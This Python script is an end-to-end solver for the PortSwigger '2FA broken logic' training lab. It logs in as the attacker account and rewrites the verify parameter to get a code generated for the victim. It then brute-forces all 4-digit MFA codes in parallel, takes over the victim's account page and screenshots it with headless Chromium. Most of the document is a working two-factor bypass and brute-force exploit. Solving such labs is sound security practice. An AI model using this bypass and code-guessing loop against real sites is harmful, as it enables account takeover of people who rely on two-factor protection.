#!/usr/bin/env python3
"""
End-to-end solver for PortSwigger "2FA broken logic" + screenshot proof.

Flow:
  1. GET  /login            -> fresh session
  2. POST /login  wiener    -> authenticated session
  3. GET  /login2?verify=carlos -> server generates a 4-digit code for carlos
  4. brute-force mfa-code   -> 302 on the right code
  5. GET  /my-account?id=carlos -> lab solved
  6. launch Chromium with the session cookies and screenshot the account page

Usage:
  python3 2fa-solve-and-shoot.py \
      --base https://<id>.web-security-academy.net \
      --self-user wiener --self-pass peter --victim carlos \
      --shot /path/shot.png
"""
from __future__ import annotations

import argparse
import base64
import json
import subprocess
import sys
import threading
import time
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

import requests

CHROME = 'chromium'


def launch_and_shoot(cookies, url, shot, port=9455, wait=4.0):
    proc = subprocess.Popen([
        CHROME, '--headless=new', '--no-sandbox', '--disable-gpu',
        f'--remote-debugging-port={port}',
        '--user-data-dir=/tmp/kilo/shot-prof',
        '--window-size=1920,1080', 'about:blank',
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        t0 = time.time()
        while time.time() - t0 < 30:
            try:
                urllib.request.urlopen(f'http://127.0.0.1:{port}/json/version', timeout=2)
                break
            except Exception:
                time.sleep(0.3)
        q = urllib.parse.quote(url, safe='')
        req = urllib.request.Request(f'http://127.0.0.1:{port}/json/new?{q}', method='PUT')
        tab = json.loads(urllib.request.urlopen(req, timeout=10).read())

        import websocket  # type: ignore
        ws = websocket.create_connection(tab['webSocketDebuggerUrl'], timeout=30,
                                         suppress_origin=True)
        mid = 0

        def send(method, params=None):
            nonlocal mid
            mid += 1
            ws.send(json.dumps({'id': mid, 'method': method, 'params': params or {}}))
            while True:
                msg = json.loads(ws.recv())
                if msg.get('id') == mid:
                    return msg

        host = urllib.parse.urlparse(url).hostname
        send('Storage.setCookies', {'cookies': [{
            'name': c.name, 'value': c.value,
            'domain': host, 'path': '/',
        } for c in cookies]})
        send('Page.enable')
        send('Page.navigate', {'url': url})
        time.sleep(wait)
        r = send('Page.captureScreenshot', {'format': 'png'})
        Path(shot).write_bytes(base64.b64decode(r['result']['data']))
        ws.close()
        print(f'[+] screenshot -> {shot}', flush=True)
    finally:
        proc.terminate()


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument('--base', required=True, help='https://<id>.web-security-academy.net')
    ap.add_argument('--self-user', default='wiener')
    ap.add_argument('--self-pass', default='peter')
    ap.add_argument('--victim', default='carlos')
    ap.add_argument('--workers', type=int, default=25)
    ap.add_argument('--width', type=int, default=4)
    ap.add_argument('--shot', default='')
    args = ap.parse_args()

    base = args.base.rstrip('/')
    s = requests.Session()
    s.headers.update({'User-Agent': 'Mozilla/5.0 (2FASolver)'})

    # 1-2. fresh session + login
    s.get(base + '/login', timeout=20)
    r = s.post(base + '/login',
               data={'username': args.self_user, 'password': args.self_pass},
               timeout=20, allow_redirects=False)
    print(f'[*] login {args.self_user}: {r.status_code}', flush=True)

    # 2b. LOG OUT — the lab requires being logged out when priming verify=<victim>,
    #     otherwise the code is generated for the logged-in user instead.
    s.get(base + '/logout', timeout=20)
    print('[*] logged out', flush=True)

    # 3. prime a code for the victim
    r = s.get(base + '/login2?verify=' + args.victim, timeout=20)
    print(f'[*] primed verify={args.victim}: {r.status_code}', flush=True)

    # 4. brute force
    codes = [str(i).zfill(args.width) for i in range(10 ** args.width)]
    lock = threading.Lock()
    state = {'stop': False, 'hit': None}

    def try_code(code):
        with lock:
            if state['stop']:
                return
        try:
            r = s.post(base + '/login2',
                       data={'verify': args.victim, 'mfa-code': code},
                       timeout=20, allow_redirects=False)
        except Exception:
            return
        if r.status_code in (301, 302, 303, 307, 308):
            with lock:
                if state['stop']:
                    return
                state['stop'] = True
                state['hit'] = (code, r.status_code, r.headers.get('Location', ''))

    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        list(ex.map(try_code, codes))

    if not state['hit']:
        print('[-] code not found', flush=True)
        return 1

    code, status, loc = state['hit']
    print(f'[+] HIT mfa-code={code} status={status} -> {loc}', flush=True)

    # 5. solve
    acct = s.get(f'{base}/my-account?id={args.victim}', timeout=20)
    home = s.get(base + '/', timeout=20)
    solved = 'Congratulations, you solved the lab' in home.text
    print(f'[*] my-account={acct.status_code} solved={solved}', flush=True)

    # 6. screenshot
    if args.shot:
        launch_and_shoot(list(s.cookies), f'{base}/my-account?id={args.victim}', args.shot)

    print(f'\nRESULT {args.self_user} -> {args.victim} mfa-code={code} solved={solved}', flush=True)
    return 0


if __name__ == '__main__':
    sys.exit(main())